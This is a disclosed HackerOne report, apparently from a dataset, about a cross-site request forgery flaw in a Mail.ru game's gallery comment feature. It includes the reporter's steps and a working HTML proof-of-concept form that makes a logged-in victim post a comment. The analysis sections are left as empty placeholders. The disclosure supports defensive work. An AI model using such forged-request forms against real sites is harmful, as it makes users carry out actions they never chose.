---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '148156'
original_report_id: '148156'
title: Cross Site Request Forgery (CSRF)
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mailru
created_at: '2016-06-29T07:11:48.282Z'
disclosed_at: '2016-07-20T16:10:10.119Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Cross Site Request Forgery (CSRF)

## Metadata

- HackerOne Report ID: 148156
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mailru
- Disclosed At: 2016-07-20T16:10:10.119Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,

I've Found __CSRF__ in ``` townwars.mail.ru/Gallery/addComment/ ```

while any user can add image to ``` townwars.mail.ru/Gallery/ ```
after that any user can add comment to this image and here there is no any protection 

_steps to reproduce_
- Go to ```   townwars.mail.ru/Gallery/ ```
- choose any photo 
- you can add a comment on a photo you choosed  
- now send this form to any user and he will put a comment 

 __example form__
``` <html>
  <body>
    <form action="https://townwars.mail.ru/Gallery/addComment/?&pid=39277&gid=515" method="POST">
      <input type="hidden" name="body" value="test" />
      <input type="hidden" name="x" value="68" />
      <input type="hidden" name="y" value="13" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
 ```

if you send this form to any login user he will put a comment on the photo in URL


__Please Check The POC Video I Attached For More Details 


Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
